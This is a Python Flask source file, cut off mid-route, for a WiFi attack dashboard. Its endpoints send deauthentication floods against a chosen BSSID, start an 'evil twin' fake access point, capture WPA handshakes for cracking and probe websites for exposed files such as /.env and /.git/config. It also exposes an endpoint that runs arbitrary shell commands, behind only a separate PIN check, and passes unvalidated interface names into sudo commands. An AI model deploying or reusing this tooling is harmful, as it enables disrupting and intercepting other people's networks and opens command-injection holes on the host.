import subprocess
import os
import re
import hashlib
import tempfile
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, abort

import subprocess
import os
import re
import hashlib
import tempfile
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, abort

base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')
app = Flask(__name__, template_folder=template_dir)

PIN_SHA256 = hashlib.sha256("062823".encode()).hexdigest()
EVIL_TWIN_CONFIG = "evil_twin.conf"

# --- Helper Functions (must be defined before use) ---
def run_capture(cmd, timeout=10):
    """Execute shell command and return structured result."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return {
            'cmd': cmd,
            'stdout': result.stdout.decode('utf-8', errors='replace'),
            'stderr': result.stderr.decode('utf-8', errors='replace'),
            'returncode': result.returncode,
            'timeout': False
        }
    except subprocess.TimeoutExpired:
        return {
            'cmd': cmd,
            'stdout': '',
            'stderr': f'Timeout after {timeout}s',
            'returncode': -1,
            'timeout': True
        }
    except Exception as e:
        return {
            'cmd': cmd,
            'stdout': '',
            'stderr': str(e),
            'returncode': -1,
            'timeout': False
        }

def get_monitor_interface():
    """Detect available monitor mode interface using aircrack-ng tools."""
    try:
        # Check for monitor interfaces
        result = run_capture("iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep mon", timeout=3)
        interfaces = [i.strip() for i in result.get('stdout', '').split('\n') if i.strip()]
        if interfaces:
            return interfaces[0]
        # Try common monitor interface names
        for iface in ['wlan0mon', 'wlan1mon', 'mon0', 'mon1']:
            result = run_capture(f"iwconfig {iface} 2>/dev/null", timeout=2)
            if result.get('returncode') == 0 and 'Mode:Monitor' in result.get('stdout', ''):
                return iface
        return None
    except Exception:
        return None

def get_interface_status(iface='wlan0'):
    """Get detailed status of a network interface."""
    status = {
        'interface': iface,
        'exists': False,
        'up': False,
        'mode': 'unknown',
        'mac': None,
        'ip': None,
        'ssid': None,
        'channel': None,
        'frequency': None,
        'signal': None
    }
    try:
        # Check if interface exists
        result = run_capture(f"ip link show {iface} 2>/dev/null", timeout=2)
        if result.get('returncode') != 0:
            return status
        status['exists'] = True
        # Check if interface is up
        if 'state UP' in result.get('stdout', ''):
            status['up'] = True
        # Get MAC address
        mac_match = re.search(r'link/ether\s+([0-9a-f:]+)', result.get('stdout', ''), re.I)
        if mac_match:
            status['mac'] = mac_match.group(1).upper()
        # Get IP address
        result = run_capture(f"ip addr show {iface} 2>/dev/null | grep 'inet '", timeout=2)
        if result.get('returncode') == 0:
            ip_match = re.search(r'inet\s+([0-9.]+)', result.get('stdout', ''))
            if ip_match:
                status['ip'] = ip_match.group(1)
        # Get wireless info using iwconfig
        result = run_capture(f"iwconfig {iface} 2>/dev/null", timeout=2)
        if result.get('returncode') == 0:
            output = result.get('stdout', '')
            # Check mode
            if 'Mode:Monitor' in output:
                status['mode'] = 'monitor'
            elif 'Mode:Managed' in output:
                status['mode'] = 'managed'
            elif 'Mode:Master' in output:
                status['mode'] = 'master'
            # Get SSID
            ssid_match = re.search(r'ESSID:"([^"]+)"', output)
            if ssid_match:
                status['ssid'] = ssid_match.group(1)
            # Get channel/frequency
            freq_match = re.search(r'Frequency:([0-9.]+)\s+GHz', output)
            if freq_match:
                status['frequency'] = freq_match.group(1) + ' GHz'
            chan_match = re.search(r'Channel\s+(\d+)', output)
            if chan_match:
                status['channel'] = chan_match.group(1)
            # Get signal strength
            sig_match = re.search(r'Signal level=(-?\d+)', output)
            if sig_match:
                status['signal'] = sig_match.group(1) + ' dBm'
    except Exception as e:
        status['error'] = str(e)
    return status

def get_all_interfaces():
    """Get status of all wireless interfaces."""
    interfaces = {}
    # Check wlan0
    interfaces['wlan0'] = get_interface_status('wlan0')
    # Check wlan1 if exists
    result = run_capture("ip link show wlan1 2>/dev/null", timeout=2)
    if result.get('returncode') == 0:
        interfaces['wlan1'] = get_interface_status('wlan1')
    # Check monitor interfaces
    mon_iface = get_monitor_interface()
    if mon_iface:
        interfaces[mon_iface] = get_interface_status(mon_iface)
    # Also check common monitor names
    for mon_name in ['wlan0mon', 'wlan1mon', 'mon0', 'mon1']:
        if mon_name not in interfaces:
            result = run_capture(f"iwconfig {mon_name} 2>/dev/null", timeout=1)
            if result.get('returncode') == 0:
                interfaces[mon_name] = get_interface_status(mon_name)
    return interfaces

def get_evil_twin_status():
    """Check if evil twin AP is running."""
    status = {
        'running': False,
        'interface': None,
        'ssid': None,
        'config_file': None,
        'process': None
    }
    try:
        # Check if hostapd is running
        result = run_capture("pgrep -f hostapd", timeout=2)
        if result.get('returncode') == 0 and result.get('stdout', '').strip():
            status['running'] = True
            status['process'] = result.get('stdout', '').strip()
        # Check config file
        config_path = os.path.join(base_dir, EVIL_TWIN_CONFIG)
        if os.path.exists(config_path):
            status['config_file'] = config_path
            try:
                with open(config_path, 'r') as f:
                    content = f.read()
                    ssid_match = re.search(r'ssid=([^\n]+)', content)
                    if ssid_match:
                        status['ssid'] = ssid_match.group(1).strip()
                    if_match = re.search(r'interface=([^\n]+)', content)
                    if if_match:
                        status['interface'] = if_match.group(1).strip()
            except Exception:
                pass
        # Check if interface is in master mode (AP mode)
        if status['interface']:
            iface_status = get_interface_status(status['interface'])
            if iface_status.get('mode') == 'master':
                status['running'] = True
    except Exception as e:
        status['error'] = str(e)
    return status

def parse_nmap_output(output):
    """Parse nmap output into structured data."""
    results = []
    current_ip = None
    current_ports = []
    for line in output.split('\n'):
        line = line.strip()
        if not line:
            continue
        # Detect IP address line: "Nmap scan report for 192.168.1.1"
        ip_match = re.search(r'for\s+([0-9.]+)', line)
        if ip_match:
            if current_ip and current_ports:
                results.append({'ip': current_ip, 'ports': current_ports})
            current_ip = ip_match.group(1)
            current_ports = []
        # Detect open port line: "21/tcp   open   ftp"
        port_match = re.match(r'(\d+)/tcp\s+open\s+(.+)', line)
        if port_match:
            port = port_match.group(1)
            service = port_match.group(2).strip()
            current_ports.append({'port': port, 'service': service})
    if current_ip and current_ports:
        results.append({'ip': current_ip, 'ports': current_ports})
    return results

# --- Authentication ---
@app.route('/api/verify_pin', methods=['POST'])
def api_verify_pin():
    try:
        data = request.get_json(force=True, silent=True) or {}
        pin = (data.get("pin") or "").strip()
        if not pin:
            return jsonify({"ok": False, "error": "PIN required"})
        pin_hash = hashlib.sha256(pin.encode()).hexdigest()
        if pin_hash == PIN_SHA256:
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": "Invalid PIN"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

# --- Basic Routes ---
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    static_favicon = os.path.join(app.root_path, 'static', 'favicon.ico')
    template_favicon = os.path.join(app.root_path, 'templates', 'favicon.ico')
    if os.path.exists(static_favicon):
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico')
    elif os.path.exists(template_favicon):
        return send_from_directory(os.path.join(app.root_path, 'templates'), 'favicon.ico')
    else:
        abort(404)

@app.route('/<path:filename>')
def serve_page(filename):
    if not filename.endswith('.html'):
        filename += '.html'
    template_path = os.path.join(app.template_folder, filename)
    if not os.path.exists(template_path):
        abort(404)
    return render_template(filename)

# --- Command Execution ---
@app.route('/api/run_command', methods=['POST'])
def run_command():
    try:
        data = request.get_json(force=True, silent=True) or {}
        cmd = (data.get('cmd') or '').strip()
        if not cmd:
            return jsonify({'error': 'No command provided'}), 400
        result = run_capture(cmd, timeout=15)
        if result.get('timeout'):
            return jsonify({'error': 'Command timed out', 'stderr': result.get('stderr')})
        elif result.get('returncode') != 0:
            return jsonify({'error': f"Command failed (exit {result.get('returncode')})", 'stderr': result.get('stderr'), 'stdout': result.get('stdout')})
        return jsonify({'ok': True, 'stdout': result.get('stdout', ''), 'stderr': result.get('stderr', ''), 'returncode': result.get('returncode', 0)})
    except Exception as e:
        return jsonify({'error': str(e)})

# --- Network Information ---
@app.route('/api/network_info')
def network_info():
    try:
        info = {}
        # Get IP addresses
        result = run_capture("hostname -I", timeout=3)
        if result.get('returncode') == 0:
            info['ip_addresses'] = result.get('stdout', '').strip().split()
        # Get routing table
        result = run_capture("ip route", timeout=3)
        if result.get('returncode') == 0:
            info['routes'] = [line.strip() for line in result.get('stdout', '').split('\n') if line.strip()]
        # Get hostname
        result = run_capture("hostname", timeout=2)
        if result.get('returncode') == 0:
            info['hostname'] = result.get('stdout', '').strip()
        # Get WiFi connection info
        result = run_capture("nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes'", timeout=3)
        if result.get('returncode') == 0:
            wifi_info = result.get('stdout', '').strip()
            if wifi_info:
                parts = wifi_info.split(':')
                info['wifi_connected'] = True
                info['wifi_ssid'] = parts[1] if len(parts) > 1 else 'Unknown'
            else:
                info['wifi_connected'] = False
        # Get uptime
        result = run_capture("uptime", timeout=2)
        if result.get('returncode') == 0:
            info['uptime'] = result.get('stdout', '').strip()
        return jsonify({'ok': True, 'info': info})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ping')
def ping_host() -> Response:
    try:
        host: str = request.args.get("host", "8.8.8.8").strip()
        if not re.match(r"^[a-zA-Z0-9.\-]+$", host) or len(host) > 64:
            return jsonify({'error': 'Invalid host'})
        
        result = run_capture(f"ping -c 3 -W 2 {host}", timeout=10)
        if result.get('timeout'):
            return jsonify({'error': 'Ping timed out'})
        
        output = result.get('stdout', '')
        # Parse ping statistics
        stats = {}
        if 'packet loss' in output:
            loss_match: re.Match[str] | None = re.search(r'(\d+)% packet loss', output)
            if loss_match:
                stats['packet_loss'] = loss_match.group(1) + '%'
        
        if 'min/avg/max' in output:
            time_match: re.Match[str] | None = re.search(r'min/avg/max[^=]*=\s*([0-9.]+)/([0-9.]+)/([0-9.]+)', output)
            if time_match:
                stats['min_time'] = time_match.group(1) + 'ms'
                stats['avg_time'] = time_match.group(2) + 'ms'
                stats['max_time'] = time_match.group(3) + 'ms'
        
        return jsonify({'ok': True, 'output': output, 'stats': stats})

    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ping_gateway')
def ping_gateway() -> Response:
    try:
        # Get default gateway
        result = run_capture("ip route | grep default | head -1", timeout=2)
        if result.get('returncode') != 0 or not result.get('stdout'):
            return jsonify(["ERROR: No default gateway found"])
        
        gw_line = result.get('stdout', '').strip()
        if "via " not in gw_line:
            return jsonify(["ERROR: Could not parse gateway"])
        
        host = gw_line.split()[2]
        if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
            return jsonify(["ERROR: Invalid gateway address"])
        
        # Ping gateway
        result = run_capture(f"ping -c 3 -W 2 {host} 2>&1", timeout=15)
        if result.get('timeout'):
            return jsonify(["TIMEOUT: Gateway ping timed out"])
        
        output = result.get('stdout', '')
        lines: list[str] = [f"Gateway: {host}"] + [line for line in output.split("\n") if line.strip()][:12]
        return jsonify(lines)
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# --- WiFi Scanning (using nmcli) ---
@app.route('/api/scan_wifi')
def scan_wifi() -> Response:
    try:
        result = run_capture("sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list", timeout=10)
        if result.get('returncode') != 0:
            return jsonify([f"ERROR: {result.get('stderr', 'WiFi scan failed')}"])
        
        output = result.get('stdout', '')
        results = []
        seen = set()
        
        for line in output.split('\n'):
            if not line:
                continue
            parts = line.split(':')
            if len(parts) >= 2:
                ssid = parts[0]
                if not ssid or ssid in seen:
                    continue
                seen.add(ssid)
                signal = parts[1] if len(parts) > 1 else "0"
                security_field = parts[2] if len(parts) > 2 else ""
                sec: str = "SECURE" if ("WPA" in security_field or "RSN" in security_field) else "OPEN"
                results.append(f"{ssid[:12].ljust(12)} {signal}% {sec}")
        
        return jsonify(results[:15] if results else ["No networks found"])
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

_BSSID_RE: re.Pattern[str] = re.compile(r'(?:^|:)([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})(?=:|$|\s)')

@app.route('/api/scan_wifi_list')
def scan_wifi_list() -> Response:
    try:
        result = run_capture("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", timeout=10)
        if result.get('returncode') != 0:
            return jsonify({"error": result.get('stderr', 'WiFi scan failed')})
        
        output = result.get('stdout', '')
        results = []
        seen_ssid = set()
        
        for line in output.split('\n'):
            if not line or len(results) >= 9:
                continue
            
            # Extract BSSID using regex
            bssid_match: re.Match[str] | None = _BSSID_RE.search(line)
            bssid: str | subprocess.Any = bssid_match.group(1).upper() if bssid_match else ""
            
            # Extract SSID (everything before BSSID)
            if bssid_match:
                ssid = line[:bssid_match.start()].rstrip(':')
            else:
                parts = line.split(':')
                ssid = parts[0] if parts else ""
            
            if not ssid or ssid in seen_ssid:
                continue
            
            seen_ssid.add(ssid)
            
            # Extract signal and channel
            parts = line.split(':')
            signal = "0"
            channel = "?"
            if len(parts) >= 3:
                # Signal is usually after BSSID
                for i, part in enumerate(parts):
                    if part.isdigit() and int(part) <= 100:
                        signal = part
                        break
                if len(parts) >= 4:
                    channel = parts[-1] if parts[-1].isdigit() else "?"
            
            results.append({"ssid": ssid, "bssid": bssid, "signal": signal, "channel": channel})
        
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/scan_wifi_list_raw')
def scan_wifi_list_raw() -> Response:
    try:
        result = run_capture("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", timeout=10)
        if result.get('returncode') != 0:
            return jsonify({"error": result.get('stderr', 'WiFi scan failed')})
        
        lines = [line for line in result.get('stdout', '').split('\n') if line.strip()][:12]
        return jsonify({"raw_lines": lines, "hint": "Each line is SSID:BSSID:SIGNAL:CHAN (BSSID has colons)"})
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Interface Management ---
@app.route('/api/interfaces/status')
def interfaces_status() -> Response:
    """Get status of all network interfaces."""
    try:
        interfaces = get_all_interfaces()
        evil_twin = get_evil_twin_status()
        return jsonify({
            'ok': True,
            'interfaces': interfaces,
            'evil_twin': evil_twin
        })

    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/<iface>/status')
def interface_status(iface) -> Response:
    """Get status of a specific interface."""
    try:
        status = get_interface_status(iface)
        return jsonify({'ok': True, 'status': status})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/evil_twin/status')
def evil_twin_status() -> Response:
    """Get evil twin AP status."""
    try:
        status = get_evil_twin_status()
        return jsonify({'ok': True, 'status': status})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/<iface>/monitor/start', methods=['POST'])
def start_monitor_mode(iface) -> Response:
    """Put interface into monitor mode using airmon-ng."""
    try:
        # First check if interface exists
        result = run_capture(f"ip link show {iface} 2>/dev/null", timeout=2)
        if result.get('returncode') != 0:
            return jsonify({'error': f'Interface {iface} not found'})
        
        # Stop NetworkManager on the interface
        run_capture(f"sudo nmcli dev set {iface} managed no 2>&1", timeout=3)
        
        # Bring interface down
        run_capture(f"sudo ip link set {iface} down 2>&1", timeout=2)
        
        # Start monitor mode using airmon-ng
        cmd: str = f"sudo airmon-ng start {iface} 2>&1"
        result = run_capture(cmd, timeout=10)
        
        if result.get('returncode') == 0:
            # Find the monitor interface name
            output = result.get('stdout', '')
            mon_match: re.Match[str] | None = re.search(r'monitor mode enabled on\s+(\w+)', output, re.I)
            if mon_match:
                mon_iface: str | subprocess.Any = mon_match.group(1)
            else:
                # Try to detect it
                mon_iface = get_monitor_interface()
            
            return jsonify({
                'ok': True,
                'msg': f'Monitor mode started on {iface}',
                'monitor_interface': mon_iface,
                'output': output[:500]
            })
        else:
            return jsonify({
                'error': 'Failed to start monitor mode',
                'stderr': result.get('stderr', ''),
                'stdout': result.get('stdout', '')
            })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/<iface>/monitor/stop', methods=['POST'])
def stop_monitor_mode(iface) -> Response:
    """Stop monitor mode and return interface to managed mode."""
    try:
        # Stop monitor mode using airmon-ng
        cmd: str = f"sudo airmon-ng stop {iface} 2>&1"
        result = run_capture(cmd, timeout=10)
        
        # Get the base interface name (remove 'mon' suffix)
        base_iface = iface.replace('mon', '')
        
        # Re-enable NetworkManager
        run_capture(f"sudo nmcli dev set {base_iface} managed yes 2>&1", timeout=3)
        
        # Bring interface up
        run_capture(f"sudo ip link set {base_iface} up 2>&1", timeout=2)
        
        if result.get('returncode') == 0:
            return jsonify({
                'ok': True,
                'msg': f'Monitor mode stopped, {base_iface} returned to managed mode',
                'output': result.get('stdout', '')[:500]
            })
        else:
            return jsonify({
                'error': 'Failed to stop monitor mode',
                'stderr': result.get('stderr', ''),
                'stdout': result.get('stdout', '')
            })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/<iface>/up', methods=['POST'])
def interface_up(iface) -> Response:
    """Bring interface up."""
    try:
        result = run_capture(f"sudo ip link set {iface} up 2>&1", timeout=5)
        if result.get('returncode') == 0:
            status = get_interface_status(iface)
            return jsonify({
                'ok': True,
                'msg': f'Interface {iface} brought up',
                'status': status
            })
        else:
            return jsonify({
                'error': f'Failed to bring {iface} up',
                'stderr': result.get('stderr', '')
            })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/interfaces/<iface>/down', methods=['POST'])
def interface_down(iface) -> Response:
    """Bring interface down."""
    try:
        result = run_capture(f"sudo ip link set {iface} down 2>&1", timeout=5)
        if result.get('returncode') == 0:
            status = get_interface_status(iface)
            return jsonify({
                'ok': True,
                'msg': f'Interface {iface} brought down',
                'status': status
            })
        else:
            return jsonify({
                'error': f'Failed to bring {iface} down',
                'stderr': result.get('stderr', '')
            })
    except Exception as e:
        return jsonify({'error': str(e)})

# --- WiFi Attacks (using aircrack-ng suite) ---
@app.route('/api/deauth', methods=['POST'])
def deauth() -> Response:
    try:
        data = request.get_json(force=True, silent=True) or {}
        bssid = (data.get("bssid") or "").strip().upper()
        
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            return jsonify({"error": "Invalid BSSID format. Use AA:BB:CC:DD:EE:FF"})
        
        # Find monitor interface
        mon_iface = get_monitor_interface()
        if not mon_iface:
            # Try to start monitor mode
            result = run_capture("sudo airmon-ng start wlan0 2>&1", timeout=5)
            mon_iface = get_monitor_interface()
            if not mon_iface:
                return jsonify({"error": "No monitor interface available. Try: sudo airmon-ng start wlan0"})
        
        # Send deauth packets using aireplay-ng
        cmd: str = f"sudo aireplay-ng -0 5 -a {bssid} {mon_iface}"
        result = run_capture(cmd, timeout=15)
        
        if result.get('returncode') == 0:
            return jsonify({
                "ok": True,
                "msg": f"Deauth packets sent to {bssid}",
                "interface": mon_iface,
                "output": result.get('stdout', '')[:500]
            })
        else:
            return jsonify({
                "error": "Deauth failed",
                "stderr": result.get('stderr', ''),
                "hint": f"Interface {mon_iface} may not be in monitor mode"
            })
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Evil Twin AP (using hostapd) ---
@app.route('/api/evil_twin', methods=['POST'])
def evil_twin() -> Response:
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        
        if not ssid:
            return jsonify({"error": "SSID required"})
        if not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Invalid SSID characters"})
        
        config_path: str = os.path.join(base_dir, EVIL_TWIN_CONFIG)
        ssid_safe = ssid.replace("\n", "").replace("\r", "")
        
        # Create hostapd config
        config_body: str = f"""interface=wlan0
driver=nl80211
ssid={ssid_safe}
channel=6
hw_mode=g
"""
        try:
            with open(config_path, "w") as f:
                f.write(config_body)
        except Exception as e:
            return jsonify({"error": f"Could not write config: {e}"})
        
        # Run hostapd in debug mode
        cmd: str = f"sudo hostapd -d {config_path} 2>&1"
        result = run_capture(cmd, timeout=8)
        
        stdout_str = result.get('stdout', '')
        hint = None
        if "unavailable" in stdout_str.lower() or "INTERFACE_UNAVAILABLE" in stdout_str:
            hint = "Interface unavailable. Release wlan0 first: nmcli dev set wlan0 managed no"
        
        return jsonify({
            "ok": result.get('returncode') == 0 or result.get('timeout'),
            "msg": f"Evil Twin AP: {ssid}",
            "stdout": stdout_str,
            "stderr": result.get('stderr', ''),
            "returncode": result.get('returncode', -1),
            "hint": hint
        })
    except Exception as e:
        return jsonify({"error": str(e)})

AP_SCRIPT_START = "scripts/start_evil_twin_ap.sh"
AP_SCRIPT_STOP = "scripts/stop_ap.sh"
AP_IP = "192.168.4.1"

@app.route('/api/evil_twin_start', methods=['POST'])
def evil_twin_start() -> Response:
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        
        if not ssid or not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Valid SSID required"})
        
        script: str = os.path.join(base_dir, AP_SCRIPT_START)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        
        result = run_capture(f"sudo bash '{script}' '{ssid}' 2>&1", timeout=25)
        return jsonify({
            "ok": result.get("returncode") == 0,
            "msg": f"AP started: {ssid}",
            "url": f"http://{AP_IP}:5000",
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
            "returncode": result.get("returncode", -1)
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/evil_twin_stop', methods=['POST'])
def evil_twin_stop() -> Response:
    try:
        script: str = os.path.join(base_dir, AP_SCRIPT_STOP)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        
        result = run_capture(f"sudo bash '{script}' 2>&1", timeout=15)
        return jsonify({
            "ok": result.get("returncode") == 0,
            "msg": "AP stopped",
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
            "returncode": result.get("returncode", -1)
        })
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Packet Sniffing (using tcpdump/tshark) ---
def beacon_sniff():
    """Capture and parse WiFi beacon frames to extract SSIDs."""
    try:
        # Use airodump-ng for better beacon capture
        mon_iface = get_monitor_interface()
        if not mon_iface:
            return {'ok': False, 'error': 'No monitor interface available'}
        
        # Capture beacons using airodump-ng (more reliable than tcpdump)
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as tmp:
            csv_file = tmp.name
        
        cmd: str = f"sudo timeout 5 airodump-ng --write /tmp/beacon_cap --output-format csv {mon_iface} 2>&1 | head -20"
        result = run_capture(cmd, timeout=8)
        
        # Try to parse CSV output
        ssids = []
        if os.path.exists('/tmp/beacon_cap-01.csv'):
            try:
                with open('/tmp/beacon_cap-01.csv', 'r') as f:
                    for line in f:
                        if 'Station MAC' in line:
                            break
                        parts = line.split(',')
                        if len(parts) > 13 and parts[13].strip():
                            ssid = parts[13].strip()
                            if ssid and ssid not in ssids:
                                ssids.append(ssid)
            except Exception:
                pass
        
        # Fallback to tcpdump if airodump failed
        if not ssids:
            cmd: str = f"sudo tcpdump -i {mon_iface} -n -c 20 type mgt subtype beacon 2>/dev/null | grep -o 'SSID: [^,]*' | cut -d' ' -f2"
            result = run_capture(cmd, timeout=8)
            ssids = [s.strip() for s in result.get('stdout', '').split('\n') if s.strip() and s.strip() != 'SSID:']
        
        return {'ok': True, 'ssids': list(set(ssids))[:20], 'count': len(ssids)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def deauth_sniff():
    """Capture deauthentication frames."""
    try:
        mon_iface = get_monitor_interface()
        if not mon_iface:
            return {'ok': False, 'error': 'No monitor interface available'}
        
        cmd: str = f"sudo tcpdump -i {mon_iface} -n -c 20 type mgt subtype deauth 2>/dev/null"
        result = run_capture(cmd, timeout=8)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
        return {'ok': True, 'deauth_packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def packet_count():
    """Count packets on wireless interface."""
    try:
        mon_iface = get_monitor_interface() or 'wlan0'
        cmd: str = f"sudo tcpdump -i {mon_iface} -n -c 20 2>/dev/null"
        result = run_capture(cmd, timeout=8)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def eapol_pmkid_scan():
    """Capture EAPOL/PMKID handshakes for WPA cracking."""
    try:
        mon_iface = get_monitor_interface()
        if not mon_iface:
            return {'ok': False, 'error': 'No monitor interface available'}
        
        # Capture EAPOL frames (WPA handshake)
        cmd: str = f"sudo tcpdump -i {mon_iface} -n -c 20 ether proto 0x888e 2>/dev/null"
        result = run_capture(cmd, timeout=8)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
        return {'ok': True, 'eapol_packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def packet_monitor():
    """Monitor all packets on wireless interface."""
    try:
        mon_iface = get_monitor_interface() or 'wlan0'
        cmd: str = f"sudo tcpdump -i {mon_iface} -n -c 20 -vvv 2>/dev/null"
        result = run_capture(cmd, timeout=8)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def channel_analyzer():
    """Analyze WiFi channels using iwlist."""
    try:
        result = run_capture("sudo iwlist wlan0 channel 2>/dev/null", timeout=5)
        if result.get('returncode') != 0:
            return {'ok': False, 'error': 'iwlist failed - interface may not support channel scanning'}
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
        return {'ok': True, 'channels': lines}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def raw_capture():
    """Capture raw packets to file."""
    try:
        mon_iface = get_monitor_interface() or 'wlan0'
        capture_file = '/tmp/cyberpwn_capture.pcap'
        cmd: str = f"sudo tcpdump -i {mon_iface} -c 20 -w {capture_file} 2>/dev/null"
        result = run_capture(cmd, timeout=8)
        if result.get('returncode') == 0 and os.path.exists(capture_file):
            return {'ok': True, 'output': f'Raw packets saved to {capture_file}', 'file': capture_file}
        else:
            return {'ok': False, 'error': 'Capture failed or file not created'}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def detect_pwnagotchi():
    """Detect Pwnagotchi devices using nmap."""
    try:
        result = run_capture("sudo nmap --script broadcast-wifi-discover 2>/dev/null", timeout=10)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip() and 'pwnagotchi' in l.lower()]
        return {'ok': True, 'wifi_devices': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def detect_pineapple():
    """Detect WiFi Pineapple devices using nmap."""
    try:
        result = run_capture("sudo nmap --script broadcast-wifi-discover 2>/dev/null", timeout=10)
        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip() and ('pineapple' in l.lower() or 'wifipineapple' in l.lower())]
        return {'ok': True, 'wifi_devices': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

# --- Sniffer API Routes ---
@app.route('/api/sniffer/beacon', methods=['POST'])
def sniffer_beacon() -> Response:
    return jsonify(beacon_sniff())

@app.route('/api/sniffer/deauth', methods=['POST'])
def sniffer_deauth() -> Response:
    return jsonify(deauth_sniff())

@app.route('/api/sniffer/packet_count', methods=['POST'])
def sniffer_packet_count() -> Response:
    return jsonify(packet_count())

@app.route('/api/sniffer/eapol_pmkid', methods=['POST'])
def sniffer_eapol_pmkid() -> Response:
    return jsonify(eapol_pmkid_scan())

@app.route('/api/sniffer/packet_monitor', methods=['POST'])
def sniffer_packet_monitor() -> Response:
    return jsonify(packet_monitor())

@app.route('/api/sniffer/channel_analyzer', methods=['POST'])
def sniffer_channel_analyzer() -> Response:
    return jsonify(channel_analyzer())

@app.route('/api/sniffer/raw_capture', methods=['POST'])
def sniffer_raw_capture() -> Response:
    return jsonify(raw_capture())

@app.route('/api/sniffer/detect_pwnagotchi', methods=['POST'])
def sniffer_detect_pwnagotchi() -> Response:
    return jsonify(detect_pwnagotchi())

@app.route('/api/sniffer/detect_pineapple', methods=['POST'])
def sniffer_detect_pineapple() -> Response:
    return jsonify(detect_pineapple())

# --- Security Scanning ---
URL_WORDLIST: list[str] = [
    "/", "/admin", "/login", "/admin.html", "/login.html", "/backup", "/backup.zip",
    "/.git/config", "/.env", "/config", "/api", "/api/", "/debug", "/phpinfo.php",
    "/wp-admin", "/wp-login.php", "/.htaccess", "/robots.txt", "/sitemap.xml",
    "/manager", "/console", "/swagger", "/graphql", "/.well-known/security.txt",
]

@app.route('/api/url_scan', methods=['POST'])
def url_scan() -> Response:
    try:
        data = request.get_json(force=True, silent=True) or {}
        base = (data.get("base_url") or "").strip().rstrip("/")
        
        if not base:
            return jsonify({"error": "base_url required"})
        if not re.match(r"^https?://[a-zA-Z0-9.\-]+(:\d+)?$", base):
            return jsonify({"error": "Invalid base_url format"})
        
        import urllib.request
        import ssl
        
        found = []
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        for path in URL_WORDLIST:
            try:
                url = base + path
                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "CyberPWN/1.0"})
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    found.append({"url": url, "status": r.getcode(), "found": True})
            except urllib.error.HTTPError as e:
                found.append({"url": url, "status": e.code, "found": e.code < 500})
            except Exception:
                found.append({"url": url, "status": 0, "found": False})
        
        return jsonify({"base": base, "found": found, "total": len(found), "accessible": sum(1 for f in found if f.get('found'))})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/cisco_vlans')
def cisco_vlans() -> Response:
    try:
        target: str = request.args.get("target", "").strip()
        
        if not target:
